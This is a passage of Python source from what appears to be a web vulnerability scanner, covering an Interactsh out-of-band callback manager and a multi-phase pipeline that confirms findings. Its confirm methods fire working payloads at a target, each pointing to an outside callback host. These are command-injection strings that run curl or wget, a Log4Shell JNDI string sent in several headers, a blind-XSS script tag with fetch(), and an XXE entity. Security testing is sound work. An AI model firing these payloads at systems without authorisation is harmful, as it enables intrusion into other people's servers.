        """Generic replay: re-fetch finding URL and confirm response."""
        url = getattr(f, "url", "") or ""
        if not url or not url.startswith(("http://", "https://")):
            return f

        r = await client.get(url)
        if not r:
            f.confidence = max(0, f.confidence - 10)
            return f

        status = r.get("status", 0)
        if status in (200, 301, 302, 403, 401):
            f.confidence = min(f.confidence + 3, 99.0)
        elif status in (404, 410):
            f.confidence = max(0, f.confidence - 15)
        return f



# ════════════════════════════════════════════════════════════════════════
#  v24 ── InteractshManager (مدير Interactsh التلقائي)
#  يشغّل interactsh-client تلقائياً في الخلفية ويحصل على domain خاص
#  لاستقبال الـ callbacks من الأهداف الخارجية.
#  إذا لم يكن interactsh-client مثبتاً، يُعرض رابط التثبيت ثم يتراجع
#  إلى المحلي. يدعم أيضاً Interactsh API مباشرة عبر HTTP.
# ════════════════════════════════════════════════════════════════════════

import subprocess as _subprocess
import hashlib as _hashlib
import base64 as _base64

class InteractshManager:
    """
    Interactsh OOB manager (v24).

    Priority order:
      1. interactsh-client binary (if installed)
      2. Interactsh REST API (oast.pro / oast.fun / oast.site)
      3. Fallback to built-in local listener (internal targets only)

    Usage:
        mgr = InteractshManager(server="oast.pro", token="")
        await mgr.start()
        domain = mgr.domain              # e.g. abc123.oast.pro
        token, cb = mgr.new_interaction() # unique sub-domain per payload
        # ... embed cb in payload ...
        confirmed = await mgr.wait_for(token, timeout=20)
        await mgr.stop()
    """

    # Public Interactsh servers (free, no token needed)
    PUBLIC_SERVERS = [
        "oast.pro",
        "oast.fun",
        "oast.site",
        "oast.online",
        "oast.me",
    ]

    def __init__(self, server: str = "", token: str = "",
                 interactsh_bin: str = "interactsh-client"):
        self._server      = server or self.PUBLIC_SERVERS[0]
        self._token       = token
        self._bin         = interactsh_bin
        self._proc        = None           # subprocess
        self._domain      = ""             # assigned unique domain
        self._interactions: dict = {}      # token -> asyncio.Event
        self._poll_task   = None
        self._session_id  = ""
        self._secret_key  = ""
        self._use_api     = False          # True = direct REST API mode
        self._use_bin     = False          # True = binary subprocess mode
        self._correlation = {}             # correlation_id -> token
        self.domain       = ""

    # ── Lifecycle ────────────────────────────────────────────────────
    async def start(self):
        """Auto-detect best mode and start."""
        if self._try_binary():
            self._use_bin = True
            log("INFO", f"[Interactsh] Using binary mode — domain: {self._domain}")
        else:
            log("INFO", "[Interactsh] Binary not found, trying REST API …")
            ok = await self._start_api_mode()
            if ok:
                self._use_api = True
                log("INFO", f"[Interactsh] API mode — domain: {self._domain}")
            else:
                log("WARN", "[Interactsh] Could not connect to Interactsh server. "
                           "OOB callbacks may not work for external targets. "
                           "Install interactsh-client: go install -v "
                           "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest")
                return

        self.domain = self._domain
        # Start polling loop
        self._poll_task = asyncio.create_task(self._poll_loop())

    async def stop(self):
        if self._poll_task:
            self._poll_task.cancel()
            try:
                await self._poll_task
            except asyncio.CancelledError:
                pass
        if self._proc:
            try:
                self._proc.terminate()
                await asyncio.sleep(0.5)
                self._proc.kill()
            except Exception:
                pass
        log("INFO", "[Interactsh] Stopped")

    # ── Binary mode ──────────────────────────────────────────────────
    def _try_binary(self) -> bool:
        """Try to start interactsh-client binary, grab the domain."""
        try:
            cmd = [
                self._bin,
                "-server", f"https://{self._server}",
                "-json",
                "-v",
            ]
            if self._token:
                cmd += ["-token", self._token]

            self._proc = _subprocess.Popen(
                cmd,
                stdout=_subprocess.PIPE,
                stderr=_subprocess.STDOUT,
                text=True,
                bufsize=1,
            )

            import time as _t
            deadline = _t.time() + 10.0
            while _t.time() < deadline:
                line = self._proc.stdout.readline()
                if not line:
                    _t.sleep(0.1)
                    continue
                line = line.strip()
                # Look for the assigned domain in output
                # Format: {"type":"initialization","correlation-id":"...","server":"..."}
                # Or plain text: "[INF] Listing on ... domain"
                if "correlation-id" in line or ".oast." in line or self._server in line:
                    try:
                        import json as _json
                        data = _json.loads(line)
                        cid  = data.get("correlation-id", "")
                        srv  = data.get("server", self._server)
                        if cid:
                            self._domain = f"{cid}.{srv}"
                            return True
                    except Exception:
                        # Try regex for plain text
                        import re as _re
                        m = _re.search(r'([a-z0-9]+\.' + re.escape(self._server) + r')', line)
                        if m:
                            self._domain = m.group(1)
                            return True
            return False
        except FileNotFoundError:
            return False
        except Exception as e:
            log("WARN", f"[Interactsh] Binary error: {e}")
            return False

    # ── API mode ─────────────────────────────────────────────────────
    async def _start_api_mode(self) -> bool:
        """Register with Interactsh REST API and get a domain."""
        import os as _os
        # Generate ECDH key pair for secret key exchange
        try:
            from cryptography.hazmat.primitives.asymmetric.ec import (
                generate_private_key, SECP256R1
            )
            from cryptography.hazmat.backends import default_backend
            _priv = generate_private_key(SECP256R1(), default_backend())
            _pub  = _priv.public_key()
            from cryptography.hazmat.primitives.serialization import (
                Encoding, PublicFormat
            )
            pub_bytes = _pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
            pub_b64   = _base64.b64encode(pub_bytes).decode()
        except ImportError:
            # No cryptography library — use simplified registration
            pub_b64 = ""

        try:
            import aiohttp as _aiohttp
            # Try each public server
            for srv in self.PUBLIC_SERVERS:
                url = f"https://{srv}/register"
                payload = {"public-key": pub_b64, "secret-key": secrets.token_hex(16)}
                try:
                    async with _aiohttp.ClientSession(
                        timeout=_aiohttp.ClientTimeout(total=10)
                    ) as sess:
                        async with sess.post(url, json=payload,
                                             ssl=False) as resp:
                            if resp.status == 200:
                                data = await resp.json(content_type=None)
                                cid  = data.get("correlation-id", "")
                                if cid:
                                    self._domain      = f"{cid}.{srv}"
                                    self._session_id  = cid
                                    self._secret_key  = payload["secret-key"]
                                    self._server      = srv
                                    return True
                except Exception:
                    continue
        except ImportError:
            pass
        return False

    # ── Polling ──────────────────────────────────────────────────────
    async def _poll_loop(self):
        """Continuously poll for interactions."""
        while True:
            try:
                await asyncio.sleep(2.0)
                if self._use_bin:
                    await self._poll_binary()
                elif self._use_api:
                    await self._poll_api()
            except asyncio.CancelledError:
                break
            except Exception as e:
                log("WARN", f"[Interactsh] Poll error: {e}")
                await asyncio.sleep(5.0)

    async def _poll_binary(self):
        """Read JSON lines from binary stdout."""
        if not self._proc or not self._proc.stdout:
            return
        import json as _json, select as _sel
        try:
            # Non-blocking read
            ready, _, _ = _sel.select([self._proc.stdout], [], [], 0.1)
            if ready:
                line = self._proc.stdout.readline().strip()
                if line:
                    data = _json.loads(line)
                    self._handle_interaction(data)
        except Exception:
            pass

    async def _poll_api(self):
        """Poll Interactsh REST API for new interactions."""
        if not self._session_id:
            return
        try:
            import aiohttp as _aiohttp, json as _json
            url = f"https://{self._server}/poll?id={self._session_id}&secret={self._secret_key}"
            async with _aiohttp.ClientSession(
                timeout=_aiohttp.ClientTimeout(total=8)
            ) as sess:
                async with sess.get(url, ssl=False) as resp:
                    if resp.status == 200:
                        data = await resp.json(content_type=None)
                        for interaction in (data.get("data") or []):
                            self._handle_interaction(interaction)
        except Exception:
            pass

    def _handle_interaction(self, data: dict):
        """Process an incoming interaction and fire matching event."""
        import json as _json
        # Interaction format: {"correlation-id": "abc123", "protocol": "http", ...}
        raw_id = data.get("correlation-id", "") or data.get("unique-id", "")
        # Match against our registered tokens
        for token, ev in list(self._interactions.items()):
            if token in raw_id or raw_id in token:
                ev.set()
                log("OK", f"[Interactsh] OOB interaction received for token: {token} "
                          f"(protocol={data.get('protocol','?')})")
                break
        # Also try full domain match
        full = data.get("full-id", "")
        if full in self._correlation:
            tok = self._correlation[full]
            if tok in self._interactions:
                self._interactions[tok].set()

    # ── Token/interaction management ─────────────────────────────────
    def new_interaction(self, label: str = "") -> tuple:
        """
        Returns (token, callback_url).
        Each call gets a unique subdomain of the Interactsh domain.
        Embed callback_url in your payload.
        """
        token  = secrets.token_hex(6)   # 12-char unique ID
        ev     = asyncio.Event()
        self._interactions[token] = ev

        # Build unique subdomain: token.correlation.server
        if self._domain:
            sub_domain = f"{token}.{self._domain}"
        else:
            sub_domain = f"{token}.oast.pro"

        cb_url = f"http://{sub_domain}"
        self._correlation[sub_domain] = token
        return token, cb_url

    # Alias for compatibility with OOBConfirmationEngine interface
    def new_token(self, label: str = "") -> tuple:
        return self.new_interaction(label)

    async def wait_for(self, token: str, timeout: float = 20.0) -> bool:
        """
        Wait up to `timeout` seconds for the interaction callback.
        Returns True if received, False if timed out.
        """
        ev = self._interactions.get(token)
        if not ev:
            return False
        try:
            await asyncio.wait_for(ev.wait(), timeout=timeout)
            return True
        except asyncio.TimeoutError:
            return False
        finally:
            self._interactions.pop(token, None)

    # ── High-level helpers (same interface as OOBConfirmationEngine) ─
    @property
    def listen_url(self) -> str:
        return f"http://{self._domain}" if self._domain else ""

    async def confirm_ssrf(self, client, url: str, param: str = "url") -> bool:
        token, cb = self.new_interaction("ssrf")
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [cb]
        test_url = urlunparse(parsed._replace(
            query=urlencode({k: v[0] for k, v in params.items()})
        ))
        await client.get(test_url)
        return await self.wait_for(token, timeout=20)

    async def confirm_log4shell(self, client, url: str) -> bool:
        token, cb = self.new_interaction("log4shell")
        cb_host = cb.replace("http://", "")
        payload = f"${{jndi:ldap://{cb_host}/a}}"
        headers = {
            "User-Agent":      payload,
            "X-Forwarded-For": payload,
            "Referer":         payload,
            "X-Api-Version":   payload,
            "Accept-Language": payload,
            "X-Client-IP":     payload,
        }
        await client.get(url, headers=headers)
        return await self.wait_for(token, timeout=20)

    async def confirm_blind_xss(self, client, url: str, param: str) -> bool:
        token, cb = self.new_interaction("blind_xss")
        payload = (
            f'"><script src="{cb}"></script>'
            f'<img src="{cb}/{token}" onerror="fetch(\'{cb}\')">'
        )
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        test_url = urlunparse(parsed._replace(
            query=urlencode({k: v[0] for k, v in params.items()})
        ))
        await client.get(test_url)
        return await self.wait_for(token, timeout=25)

    async def confirm_xxe(self, client, url: str) -> bool:
        token, cb = self.new_interaction("xxe")
        cb_host = cb.replace("http://", "")
        xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{cb_host}/xxe">]>
<root><data>&xxe;</data></root>"""
        try:
            await client.post(url, data=xxe_payload,
                              headers={"Content-Type": "application/xml"})
        except Exception:
            pass
        return await self.wait_for(token, timeout=20)

    async def confirm_rce(self, client, url: str, param: str = "cmd") -> bool:
        """Inject curl/wget RCE payload pointing to OOB callback."""
        token, cb = self.new_interaction("rce")
        payloads = [
            f"$(curl -s {cb}/{token})",
            f"`wget -q -O- {cb}/{token}`",
            f"; curl -s {cb}/{token} #",
            f"| curl -s {cb}/{token}",
            f"& curl -s {cb}/{token} &",
        ]
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for pl in payloads:
            try:
                params[param] = [pl]
                test_url = urlunparse(parsed._replace(
                    query=urlencode({k: v[0] for k, v in params.items()})
                ))
                await client.get(test_url)
            except Exception:
                pass
        return await self.wait_for(token, timeout=20)


# ════════════════════════════════════════════════════════════════════════
#  v24 ── SmartOOBEngine (محرك OOB الذكي)
#  يختار تلقائياً بين 3 أوضاع:
#    1. Interactsh (للأهداف الخارجية) — الأولوية الأولى
#    2. Local HTTP listener (للأهداف الداخلية/الشبكة المحلية)
#    3. بدون OOB (إذا فشل كل شيء) — لا يوقف الفحص
# ════════════════════════════════════════════════════════════════════════

class SmartOOBEngine:
    """
    Intelligent OOB orchestrator (v24).
    Auto-selects the best OOB backend based on target reachability.

    - External target  → uses Interactsh (oast.pro / custom server)
    - Internal target  → uses built-in local HTTP listener
    - No connectivity  → graceful degradation (scan continues without OOB)
    """

    def __init__(self, target: str = "", args=None):
        self._target     = target
        self._args       = args
        self._backend    = None   # InteractshManager or OOBConfirmationEngine
        self._mode       = "none"
        self.domain      = ""
        self.listen_url  = ""

    async def start(self):
        args = self._args
        target = self._target

        # User explicitly chose interactsh
        use_interactsh = getattr(args, "use_interactsh", False)
        # User explicitly chose local listener
        use_local      = getattr(args, "oob_server", False) and not use_interactsh

        if use_interactsh or self._is_external(target):
            log("INFO", "[SmartOOB] External target detected → using Interactsh")
            srv   = getattr(args, "interactsh_server", "") or ""
            token = getattr(args, "interactsh_token", "") or ""
            ibin  = getattr(args, "interactsh_client", "interactsh-client") or "interactsh-client"

            mgr = InteractshManager(server=srv, token=token, interactsh_bin=ibin)
            await mgr.start()

            if mgr.domain:
                self._backend  = mgr
                self._mode     = "interactsh"
                self.domain    = mgr.domain
                self.listen_url = f"http://{mgr.domain}"
                log("OK", f"[SmartOOB] Interactsh active — domain: {self.domain}")
                return
            else:
                log("WARN", "[SmartOOB] Interactsh failed, falling back to local listener")

        # Local listener mode
        if not self._is_external(target) or use_local:
            log("INFO", "[SmartOOB] Internal target → using local HTTP listener")
            port    = getattr(args, "oob_port", 0) or 0
            pub_h   = getattr(args, "oob_host", "") or ""
            engine  = OOBConfirmationEngine(port=port, public_host=pub_h)
            await engine.start()
            self._backend   = engine
            self._mode      = "local"
            self.listen_url = engine.listen_url
            self.domain     = engine.listen_url
            log("OK", f"[SmartOOB] Local listener active — {self.listen_url}")
            return

        log("WARN", "[SmartOOB] No OOB backend available — OOB confirmations disabled")
        self._mode = "none"

    async def stop(self):
        if self._backend:
            await self._backend.stop()

    def _is_external(self, target: str) -> bool:
        """Heuristic: is the target on the public internet?"""
        import ipaddress as _ip
        from urllib.parse import urlparse as _up
        try:
            host = _up(target).hostname or ""
            # Check if it's an IP
            addr = _ip.ip_address(host)
            return addr.is_global
        except ValueError:
            # It's a hostname — assume external if not .local / .internal
            local_tlds = (".local", ".internal", ".intranet", ".corp", ".lan")
            if any(host.endswith(t) for t in local_tlds):
                return False
            if host in ("localhost", "127.0.0.1", "::1"):
                return False
            return True
        except Exception:
            return False

    # Delegate all OOB methods to backend ─────────────────────────────
    def new_token(self, label: str = "") -> tuple:
        if self._backend and hasattr(self._backend, "new_interaction"):
            return self._backend.new_interaction(label)
        elif self._backend:
            return self._backend.new_token(label)
        return (secrets.token_hex(8), "")

    async def wait_for(self, token: str, timeout: float = 20.0) -> bool:
        if not self._backend:
            return False
        return await self._backend.wait_for(token, timeout=timeout)

    async def confirm_ssrf(self, client, url: str, param: str = "url") -> bool:
        if not self._backend:
            return False
        return await self._backend.confirm_ssrf(client, url, param)

    async def confirm_log4shell(self, client, url: str) -> bool:
        if not self._backend:
            return False
        return await self._backend.confirm_log4shell(client, url)

    async def confirm_blind_xss(self, client, url: str, param: str) -> bool:
        if not self._backend:
            return False
        return await self._backend.confirm_blind_xss(client, url, param)

    async def confirm_xxe(self, client, url: str) -> bool:
        if not self._backend or not hasattr(self._backend, "confirm_xxe"):
            return False
        return await self._backend.confirm_xxe(client, url)

    async def confirm_rce(self, client, url: str, param: str = "cmd") -> bool:
        if not self._backend or not hasattr(self._backend, "confirm_rce"):
            return False
        return await self._backend.confirm_rce(client, url, param)

    @property
    def available(self) -> bool:
        return self._mode != "none"

    @property
    def mode(self) -> str:
        return self._mode

# ════════════════════════════════════════════════════════════════════════
#  v23 ── DEEP CONFIRM ORCHESTRATOR
#  Runs all three engines in sequence after main scan completes.
# ════════════════════════════════════════════════════════════════════════

async def run_deep_confirm(findings: list, target: str, args,
                           oob_engine = None) -> list:
    """
    Full deep-confirm pipeline (v23):
      Phase 1 — Triple-Confirm (eliminate FP with canary)
      Phase 2 — Deep Accuracy Validator (specialised per vuln type)
      Phase 3 — OOB re-confirmation for SSRF/XXE findings (if OOB available)

    Returns cleaned, high-confidence findings list.
    """
    if not findings:
        return findings

    log("INFO", f"[DeepConfirm] Starting full confirmation pipeline "
                f"({len(findings)} findings) …")

    cfg = ScanConfig(
        timeout=getattr(args, "timeout", 30),
        concurrency=min(getattr(args, "concurrency", 10), 8),
        delay=max(getattr(args, "delay", 0.1), 0.1),
        rate_limit=getattr(args, "rate_limit", 30),
        retries=2,
        proxy=getattr(args, "proxy", "") or "",
        verbose=getattr(args, "verbose", False),
        proxy_list=[],
        cookies=getattr(args, "cookie", "") or "",
        custom_headers={
            k: v for h in (getattr(args, "header", None) or [])
            for k, v in [h.split(":", 1)] if ":" in h
        },
    )
    client = WebScoutClient(cfg)

    try:
        # Phase 1 — Triple Confirm
        tc = TripleConfirmEngine()
        findings = await tc.validate(findings, client)
        log("OK", f"[DeepConfirm] Phase 1 done — {len(findings)} findings remain")

        # Phase 2 — Deep Accuracy Validator
        dv = DeepAccuracyValidator()
        findings = await dv.validate(findings, client)
        log("OK", f"[DeepConfirm] Phase 2 done — {len(findings)} findings remain")

        # Phase 3 — OOB re-confirm for SSRF/XXE/Log4Shell/RCE (v24: SmartOOBEngine)
        if oob_engine and getattr(oob_engine, "available", True):
            OOB_PLUGINS = {
                "ssrf":       ("confirm_ssrf",      ["ssrf"]),
                "xxe":        ("confirm_xxe",        ["xxe"]),
                "log4shell":  ("confirm_log4shell",  ["log4j", "log4shell"]),
                "blind_xss":  ("confirm_blind_xss",  ["blind_xss"]),
                "rce":        ("confirm_rce",         ["cmd_injection", "rce", "command"]),
            }
            oob_findings = []
            for f in findings:
                plugin = (getattr(f, "plugin", "") or "").lower()
                for key, (method, tags) in OOB_PLUGINS.items():
                    if any(t in plugin for t in tags):
                        if hasattr(oob_engine, method):
                            oob_findings.append((f, method))
                            break

            if oob_findings:
                oob_mode = getattr(oob_engine, "mode", "unknown")
                log("INFO", f"[DeepConfirm] Phase 3 OOB re-testing "
                            f"{len(oob_findings)} findings via {oob_mode} …")
                for f, method in oob_findings:
                    url   = getattr(f, "url", "") or target
                    param = getattr(f, "param", "url") or "url"
                    try:
                        fn = getattr(oob_engine, method)
                        if method in ("confirm_ssrf", "confirm_blind_xss", "confirm_rce"):
                            ok = await fn(client, url, param)
                        else:
                            ok = await fn(client, url)
                    except Exception as _oe:
                        log("WARN", f"[OOB] {method} error: {_oe}")
                        ok = False

                    if ok:
                        f.confidence = 99.0
                        f.evidence   = (
                            f"{f.evidence or ''} | OOB callback received ✓ "
                            f"[via {oob_mode}]"
                        )
                        log("OK", f"[OOB/{oob_mode}] Confirmed: {f.title}")
                    else:
                        f.confidence = max(0, f.confidence - 20)
                        log("INFO", f"[OOB] No callback for: {f.title} (confidence reduced)")

            log("OK", f"[DeepConfirm] Phase 3 done")

    finally:
        await client.close()

    log("OK", f"[DeepConfirm] Pipeline complete — {len(findings)} high-confidence findings")
    return findings

def run_manual_mode():
    """Entry point for --manual flag."""
    mode = ManualTestingMode()
    try:
        asyncio.run(mode.run())
    except KeyboardInterrupt:
        print("\n\n[Manual Mode] Interrupted by user.")


